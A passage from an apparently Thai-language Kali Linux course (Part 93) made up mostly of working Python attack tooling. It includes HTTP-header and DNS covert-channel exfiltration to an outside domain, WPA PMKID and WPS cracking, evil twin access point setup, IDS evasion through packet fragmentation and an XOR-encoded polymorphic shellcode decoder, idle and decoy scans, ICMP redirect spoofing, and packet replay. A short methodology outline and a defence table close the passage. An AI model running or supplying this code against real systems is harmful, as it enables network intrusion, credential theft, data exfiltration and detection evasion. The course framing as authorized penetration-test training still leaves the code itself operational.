            "Accept": "text/html,application/xhtml+xml",
            "X-Request-ID": encoded[:50],       # ซ่อนข้อมูลใน custom headers
            "X-Correlation-ID": encoded[50:100] if len(encoded) > 50 else "",
        }
        
        response = requests.get(target_url, headers=headers)
        return response.status_code
    
    # === DNS Covert Channel (review Part 86 for full implementation) ===
    
    def dns_exfil(self, data: str, domain: str, 
                   dns_server: str = "8.8.8.8"):
        """Exfiltrate via DNS queries"""
        import zlib
        import base64
        
        compressed = zlib.compress(data.encode())
        encoded = base64.b32encode(compressed).decode().lower()
        
        # แบ่งเป็น 63-byte chunks (DNS label limit)
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        
        for i, chunk in enumerate(chunks):
            subdomain = f"{chunk}.{i:04x}.data.{domain}"
            try:
                DNS.query(subdomain, "A", dns_server)
            except:
                pass
        
        # End marker
        DNS_query_end = f"end.{len(chunks):04x}.data.{domain}"
```

---

## 9. Protocol Fuzzing

```python
# protocol_fuzzer.py
# Network protocol fuzzer สำหรับค้นหาช่องโหว

import socket
import time
import random
import struct
from typing import List, Generator

class ProtocolFuzzer:
    
    def __init__(self, target: str, port: int, proto: str = "tcp"):
        self.target = target
        self.port = port
        self.proto = proto.lower()
        self.crash_cases = []
    
    def _connect(self):
        if self.proto == "tcp":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target, self.port))
            return s
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            return s
    
    def _send(self, s, data: bytes) -> bytes:
        if self.proto == "tcp":
            s.send(data)
            try:
                return s.recv(4096)
            except:
                return b""
        else:
            s.sendto(data, (self.target, self.port))
            try:
                return s.recv(4096)[0]
            except:
                return b""
    
    def mutation_fuzzer(self, seed: bytes, 
                         iterations: int = 1000) -> List[bytes]:
        """Mutation-based fuzzing"""
        test_cases = []
        
        mutations = [
            # Bit flip
            lambda d: bytes([d[i] ^ 1 if i < len(d) else x
                           for i, x in enumerate(d)]),
            # Byte insertion
            lambda d: d[:len(d)//2] + random.randbytes(10) + d[len(d)//2:],
            # Repetition
            lambda d: d * random.randint(2, 100),
            # Truncation
            lambda d: d[:random.randint(0, len(d))],
            # Boundary values
            lambda d: d.replace(d[:4], struct.pack(">I", 0xFFFFFFFF)) if len(d) >= 4 else d,
        ]
        
        for i in range(iterations):
            data = seed[:]
            # Apply 1-3 random mutations
            for _ in range(random.randint(1, 3)):
                mutation = random.choice(mutations)
                data = mutation(data)
            test_cases.append(data)
        
        return test_cases
    
    def fuzz(self, seed: bytes, iterations: int = 1000):
        """Run fuzzing campaign"""
        print(f"[*] Fuzzing {self.target}:{self.port}/{self.proto}")
        print(f"[*] Iterations: {iterations}")
        
        test_cases = self.mutation_fuzzer(seed, iterations)
        
        for i, payload in enumerate(test_cases):
            try:
                s = self._connect()
                response = self._send(s, payload)
                s.close()
                
                if i % 100 == 0:
                    print(f"[*] Progress: {i}/{iterations}")
            
            except ConnectionRefusedError:
                print(f"[!!!] Connection refused at iteration {i} - possible crash!")
                self.crash_cases.append({
                    "iteration": i,
                    "payload": payload.hex(),
                    "payload_len": len(payload)
                })
                time.sleep(1)  # รอ service restart
            
            except socket.timeout:
                self.crash_cases.append({
                    "iteration": i,
                    "payload": payload.hex(),
                    "cause": "timeout"
                })
            
            except Exception as e:
                print(f"[!] Error at {i}: {e}")
        
        print(f"\n[+] Fuzzing complete. Crashes: {len(self.crash_cases)}")
        return self.crash_cases

if __name__ == "__main__":
    fuzzer = ProtocolFuzzer("127.0.0.1", 9999)
    # Seed = valid protocol message
    seed = b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
    crashes = fuzzer.fuzz(seed, iterations=5000)
    print(json.dumps(crashes, indent=2))
```

---

## 10. VPN Security Testing

```python
# vpn_tester.py
# VPN security testing (authorized)

import subprocess
import socket
import re
from typing import Dict, List

class VPNSecurityTester:
    
    def check_vpn_config_files(self, config_path: str) -> Dict:
        """Analyze VPN configuration for weaknesses"""
        issues = []
        
        try:
            with open(config_path) as f:
                config = f.read()
        except:
            return {"error": "Cannot read config"}
        
        # OpenVPN checks
        if "tls-auth" not in config and "tls-crypt" not in config:
            issues.append("No TLS authentication (tls-auth/tls-crypt)")
        
        if "cipher" in config:
            cipher_match = re.search(r'cipher\s+(\S+)', config)
            if cipher_match:
                cipher = cipher_match.group(1)
                weak_ciphers = ["DES", "RC2", "RC4", "BF", "CAST"]
                if any(c in cipher for c in weak_ciphers):
                    issues.append(f"Weak cipher: {cipher}")
        else:
            issues.append("No explicit cipher configured")
        
        if "verify-x509-name" not in config:
            issues.append("No server certificate verification (verify-x509-name)")
        
        if "remote-cert-tls server" not in config:
            issues.append("Missing remote-cert-tls server")
        
        if "comp-lzo" in config or "compress" in config:
            issues.append("Compression enabled (VORACLE attack risk)")
        
        return {"file": config_path, "issues": issues}
    
    def test_ipsec_config(self, target: str) -> Dict:
        """Test IPsec VPN configuration"""
        results = {}
        
        # ตรวจสอบ IKE version
        ike_result = subprocess.run(
            ["ike-scan", "--version", target],
            capture_output=True, text=True, timeout=10
        )
        results["ike_scan"] = ike_result.stdout
        
        # ตรวจสอบ weak IKE transforms
        weak_result = subprocess.run(
            ["ike-scan", "--showbackoff",
             "--trans=5,2,1,2",  # DES, MD5 (weak!)
             target],
            capture_output=True, text=True, timeout=10
        )
        results["weak_transforms"] = weak_result.stdout
        
        return results
    
    def detect_vpn_type(self, target: str) -> List[str]:
        """Detect VPN technology from port scan"""
        vpn_ports = {
            1194: "OpenVPN",
            500: "IPsec/IKE",
            4500: "IPsec NAT-T",
            1723: "PPTP",
            1701: "L2TP",
            443: "SSL VPN (AnyConnect/SSTP)",
            8443: "SSL VPN alternative",
        }
        
        found_vpns = []
        
        for port, vpn_type in vpn_ports.items():
            try:
                proto = "udp" if port in [500, 4500, 1194] else "tcp"
                if proto == "tcp":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    result = s.connect_ex((target, port))
                    s.close()
                    if result == 0:
                        found_vpns.append((port, vpn_type, proto))
                else:
                    # UDP check
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.settimeout(2)
                    s.sendto(b"\x00" * 10, (target, port))
                    try:
                        s.recv(100)
                        found_vpns.append((port, vpn_type, proto))
                    except socket.timeout:
                        # Timeout doesn't mean closed for UDP
                        pass
                    s.close()
            except:
                pass
        
        return found_vpns
```

---

## 11. Wireless Advanced Attacks

```python
# wireless_advanced.py
# Advanced wireless attacks (authorized lab)

import subprocess
from typing import List, Dict

class WirelessAdvanced:
    
    def pmkid_attack(self, interface: str, target_bssid: str):
        """
        PMKID Attack - ไม่ต้องมีเครื่อง client
        CVE-2018-XXXX - Jens Steube (hashcat author)
        """
        print(f"[*] PMKID Attack on {target_bssid}")
        
        # Step 1: Capture PMKID ด้วย hcxdumptool
        cmd1 = [
            "hcxdumptool",
            "-i", interface,
            "--enable_status=1",
            "--filtermode=2",
            "--filterlist_ap", target_bssid.replace(':', '').lower(),
            "-o", "/tmp/pmkid_capture.pcapng",
            "--duration=30"
        ]
        
        print("Step 1: Capturing PMKID...")
        subprocess.run(cmd1, timeout=35)
        
        # Step 2: Extract PMKID ด้วย hcxpcapngtool
        cmd2 = [
            "hcxpcapngtool",
            "-o", "/tmp/pmkid.hash",
            "/tmp/pmkid_capture.pcapng"
        ]
        subprocess.run(cmd2)
        
        # Step 3: Crack ด้วย hashcat
        cmd3 = [
            "hashcat",
            "-m", "22000",  # WPA-PBKDF2-PMKID+EAPOL
            "/tmp/pmkid.hash",
            "/usr/share/wordlists/rockyou.txt",
            "--force"
        ]
        
        print("Step 3: Cracking with hashcat...")
        result = subprocess.run(cmd3, capture_output=True, text=True, timeout=300)
        
        return result.stdout
    
    def evil_twin_attack(self, target_ssid: str, 
                          target_bssid: str,
                          interface: str = "wlan0"):
        """
        Evil Twin AP เพื่อดักครัดเนเชียล
        ใช้เฉพาะ authorized testing!
        """
        print(f"[*] Setting up Evil Twin for {target_ssid}")
        
        # hostapd config
        hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        with open("/tmp/evil_twin_hostapd.conf", "w") as f:
            f.write(hostapd_conf)
        
        # DHCP config (dnsmasq)
        dnsmasq_conf = """
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""
        with open("/tmp/evil_twin_dnsmasq.conf", "w") as f:
            f.write(dnsmasq_conf)
        
        print("\nLaunch these in separate terminals:")
        print(f"  hostapd /tmp/evil_twin_hostapd.conf")
        print(f"  dnsmasq -C /tmp/evil_twin_dnsmasq.conf")
        print(f"  mitmproxy --mode transparent -p 8080")
    
    def wps_attack(self, interface: str, target_bssid: str):
        """
        WPS Brute Force / Pixie Dust Attack
        """
        print(f"[*] WPS attack on {target_bssid}")
        
        # Pixie Dust Attack (offline)
        cmd = [
            "reaver",
            "-i", interface,
            "-b", target_bssid,
            "-v",
            "-K", "1",   # Pixie Dust mode
            "-N"         # No association timeout
        ]
        
        print("Running Pixie Dust attack...")
        result = subprocess.run(cmd, capture_output=True, text=True, 
                               timeout=120)
        
        # ค้นหา PIN ใน output
        pin_match = re.search(r'WPS PIN: (\d+)', result.stdout)
        psk_match = re.search(r'WPA PSK: (.+)', result.stdout)
        
        return {
            "pin": pin_match.group(1) if pin_match else None,
            "psk": psk_match.group(1) if psk_match else None
        }
```

---

## 12. Network Detection Evasion

```python
# evasion_techniques.py
# Network-level IDS/IPS evasion

from scapy.all import *
import random
import time

class NetworkEvasion:
    
    def fragment_payload(self, target: str, payload: bytes,
                          frag_size: int = 8):
        """IP fragmentation เพื่อหลบ IDS"""
        packets = fragment(
            IP(dst=target) /
            TCP(dport=80, flags="S") /
            payload,
            fragsize=frag_size
        )
        
        # ส่งไม่เรียงลำดับ
        random.shuffle(packets)
        
        for pkt in packets:
            send(pkt, verbose=False)
            time.sleep(random.uniform(0.01, 0.1))
    
    def tcp_segmentation_evasion(self, target: str, port: int,
                                  payload: bytes, seg_size: int = 2):
        """TCP segmentation - แบ่ง payload เป็นส่วนเล็กๆ"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        
        # ส่งทีละเล็กน้อย bytes
        for i in range(0, len(payload), seg_size):
            s.send(payload[i:i+seg_size])
            time.sleep(random.uniform(0, 0.05))
        
        response = s.recv(4096)
        s.close()
        return response
    
    def polymorphic_payload(self, shellcode: bytes) -> bytes:
        """สร้าง polymorphic shellcode (XOR encoded)"""
        key = random.randint(1, 254)
        encoded = bytes([b ^ key for b in shellcode])
        
        # Decoder stub (x86)
        decoder = bytearray([
            0xeb, 0x09,              # jmp short decoder_end
            # decoder:
            0x31, 0xc9,              # xor ecx, ecx
            0xb1, len(shellcode),    # mov cl, len
            0x80, 0x31, key,         # xor [ecx], key
            0xe2, 0xfb,              # loop decoder
            # decoder_end:
        ])
        
        return bytes(decoder) + encoded
    
    def decoy_scan(self, target: str, port: int,
                    num_decoys: int = 10):
        """Scan ด้วย decoy IPs (nmap -D)"""
        # สร้าง decoy IPs
        decoys = [
            f"{random.randint(1,254)}.{random.randint(1,254)}."
            f"{random.randint(1,254)}.{random.randint(1,254)}"
            for _ in range(num_decoys)
        ]
        
        attacker_ip = "192.168.1.100"  # สอดแทรกในที่ 5
        decoys.insert(5, attacker_ip)
        decoy_str = ",".join(decoys)
        
        print(f"[*] Decoy scan with {num_decoys} decoys")
        cmd = f"nmap -sS -D {decoy_str} {target} -p {port}"
        return subprocess.run(cmd.split(), capture_output=True, text=True)
```

---

## 13. Advanced Scanning Techniques

```python
# advanced_scanner.py
# Advanced network scanning techniques

from scapy.all import *
import concurrent.futures
from typing import List, Dict

class AdvancedScanner:
    
    def syn_scan(self, target: str, ports: List[int], 
                  timeout: float = 2.0) -> Dict:
        """SYN (half-open) scan"""
        open_ports = {}
        
        for port in ports:
            pkt = IP(dst=target) / TCP(dport=port, flags="S")
            response = sr1(pkt, timeout=timeout, verbose=False)
            
            if response:
                if response.haslayer(TCP):
                    tcp_flags = response[TCP].flags
                    if tcp_flags == 0x12:  # SYN-ACK = open
                        open_ports[port] = "open"
                        # RST เพื่อไม่เสร็จ handshake
                        send(IP(dst=target) / TCP(dport=port, flags="R"),
                             verbose=False)
                    elif tcp_flags == 0x14:  # RST-ACK = closed
                        open_ports[port] = "closed"
        
        return open_ports
    
    def idle_scan(self, zombie_ip: str, target: str, 
                   ports: List[int]) -> Dict:
        """
        Idle Scan (Zombie Scan) - true stealth scan
        ใช้ zombie host สแกน ไม่มี attacker IP ใน target logs
        """
        open_ports = {}
        
        def get_zombie_ipid():
            """Get IPID from zombie"""
            pkt = IP(dst=zombie_ip) / TCP(dport=80, flags="SA")
            response = sr1(pkt, timeout=2, verbose=False)
            if response:
                return response[IP].id
            return None
        
        for port in ports:
            # Step 1: Get initial zombie IPID
            ipid1 = get_zombie_ipid()
            if ipid1 is None:
                continue
            
            # Step 2: Spoof SYN to target ส่งจาก zombie IP
            spoof_pkt = (
                IP(src=zombie_ip, dst=target) /
                TCP(dport=port, flags="S")
            )
            send(spoof_pkt, verbose=False)
            
            # Step 3: Get zombie IPID อีกครั้ง
            ipid2 = get_zombie_ipid()
            if ipid2 is None:
                continue
            
            # ถ้า IPID เพิ่มขึ้น 2 = port open (zombie ได้รับ SYN-ACK)
            # ถ้า IPID เพิ่มขึ้น 1 = port closed
            if ipid2 - ipid1 >= 2:
                open_ports[port] = "open"
                print(f"[+] Port {port}/tcp OPEN")
            else:
                open_ports[port] = "closed"
        
        return open_ports
    
    def os_fingerprint(self, target: str) -> Dict:
        """Passive OS fingerprinting"""
        fingerprint = {}
        
        # TTL-based OS detection
        pkt = IP(dst=target) / ICMP()
        response = sr1(pkt, timeout=2, verbose=False)
        
        if response:
            ttl = response[IP].ttl
            
            # Infer initial TTL
            if 60 <= ttl <= 64:
                fingerprint["os"] = "Linux/Unix"
                fingerprint["ttl"] = ttl
            elif 120 <= ttl <= 128:
                fingerprint["os"] = "Windows"
                fingerprint["ttl"] = ttl
            elif 250 <= ttl <= 255:
                fingerprint["os"] = "Cisco/Network Device"
                fingerprint["ttl"] = ttl
        
        # TCP Window Size fingerprinting
        syn_pkt = IP(dst=target) / TCP(dport=80, flags="S")
        syn_response = sr1(syn_pkt, timeout=2, verbose=False)
        
        if syn_response and TCP in syn_response:
            window = syn_response[TCP].window
            fingerprint["tcp_window"] = window
            
            # Common window sizes
            if window == 65535:
                fingerprint["os_hint"] = "OpenBSD/MacOS"
            elif window == 8192:
                fingerprint["os_hint"] = "Windows XP/Vista"
            elif window == 5840:
                fingerprint["os_hint"] = "Linux"
            
            # RST
            send(IP(dst=target) / TCP(dport=80, flags="R"),
                 verbose=False)
        
        return fingerprint
```

---

## 14. Custom Packet Crafting

```python
# packet_crafter.py
# Custom packet crafting ด้วย Scapy

from scapy.all import *
import json
from typing import List

class PacketCrafter:
    
    def craft_tcp_rst(self, src_ip: str, dst_ip: str,
                       src_port: int, dst_port: int,
                       seq: int) -> Packet:
        """Craft TCP RST เพื่อตัดสัมพันธ์"""
        return (
            IP(src=src_ip, dst=dst_ip) /
            TCP(
                sport=src_port,
                dport=dst_port,
                flags="R",
                seq=seq
            )
        )
    
    def craft_icmp_redirect(self, original_src: str, 
                             original_dst: str,
                             new_gateway: str) -> Packet:
        """ICMP Redirect เพื่อเปลี่ยน routing"""
        return (
            IP(
                src=original_dst,    # ปลอมเป็น gateway
                dst=original_src     # ส่งถึง victim
            ) /
            ICMP(
                type=5,              # Redirect
                code=1,              # Redirect for host
                gw=new_gateway       # New gateway = attacker
            ) /
            IP(
                src=original_src,    # Original packet src
                dst=original_dst,    # Original packet dst
                proto=6              # TCP
            ) /
            TCP(dport=80)            # Original TCP header
        )
    
    def craft_bgp_open(self, my_as: int, bgp_id: str,
                        src_ip: str, dst_ip: str) -> Packet:
        """Craft BGP OPEN message"""
        import struct
        
        # BGP OPEN message
        marker = b'\xff' * 16
        bgp_id_bytes = socket.inet_aton(bgp_id)
        
        # OPEN body
        open_body = struct.pack(
            "!BHH4sB",
            4,           # BGP version
            my_as,       # My AS
            180,         # Hold time
            bgp_id_bytes,  # BGP Identifier
            0            # Optional parameters length
        )
        
        # Full message
        msg_len = 19 + len(open_body)
        bgp_msg = marker + struct.pack("!HB", msg_len, 1) + open_body
        
        return (
            IP(src=src_ip, dst=dst_ip) /
            TCP(dport=179, flags="PA") /
            Raw(load=bgp_msg)
        )
    
    def replay_packets(self, pcap_file: str, target_ip: str, 
                        iface: str = None):
        """Replay captured packets to new target"""
        pkts = rdpcap(pcap_file)
        
        modified = []
        for pkt in pkts:
            if IP in pkt:
                # Redirect to new target
                pkt[IP].dst = target_ip
                del pkt[IP].chksum  # ให้ Scapy คำนวณใหม่
                if TCP in pkt:
                    del pkt[TCP].chksum
                modified.append(pkt)
        
        print(f"[*] Replaying {len(modified)} packets to {target_ip}")
        sendp(modified, iface=iface or conf.iface, 
              inter=0.01, verbose=False)
        print("[+] Replay complete")

if __name__ == "__main__":
    crafter = PacketCrafter()
    
    # ICMP Redirect example
    redirect_pkt = crafter.craft_icmp_redirect(
        original_src="192.168.1.10",
        original_dst="192.168.1.1",
        new_gateway="192.168.1.100"  # attacker
    )
    print(redirect_pkt.show())
```

---

## 15. สรุป Advanced Network Attacks

### Network Pentest Methodology

```
Phase 1: Reconnaissance
  - Passive: Shodan, Censys, DNS, BGP looking glass
  - Active: Port scan, service fingerprint, OS detection

Phase 2: Network Mapping  
  - Topology discovery
  - VLAN enumeration
  - IPv6 discovery
  - Wireless AP detection

Phase 3: Vulnerability Analysis
  - Protocol vulnerabilities
  - Weak authentication
  - Misconfigured services
  - Legacy protocols (Telnet, FTP, HTTP)

Phase 4: Exploitation
  - MITM attacks
  - Credential interception
  - Traffic manipulation
  - Protocol abuse

Phase 5: Lateral Movement
  - Internal network pivoting
  - VLAN hopping
  - Routing manipulation
  - DNS poisoning

Phase 6: Reporting
  - Technical findings
  - Business impact
  - Remediation recommendations
```

### Detection และป้องกัน

| การโจมตี | วิธีป้องกัน | Detection |
|-------|------------|------------|
| ARP Spoofing | Dynamic ARP Inspection (DAI) | ARP table monitoring |
| SSL Strip | HSTS, HSTS Preloading | Certificate transparency |
| DNS Poison | DNSSEC, DoT, DoH | DNS query monitoring |
| VLAN Hop | Disable DTP, use dedicated VLAN | L2 flow analysis |
| IPv6 RA Spoof | RA Guard on switches | IPv6 traffic monitoring |
| MITM | Certificate pinning, MTA-STS | TLS inspection |

---

> **Navigation:** ← [Part 92: Malware Analysis](Part-92-Malware-Analysis.md) | [Part 94: Active Directory Advanced](Part-94-Active-Directory-Advanced.md) →

---
*Part 93 of the Kali Linux Professional Course | Advanced Network Attacks: MITM, Protocol Abuse, Evasion*
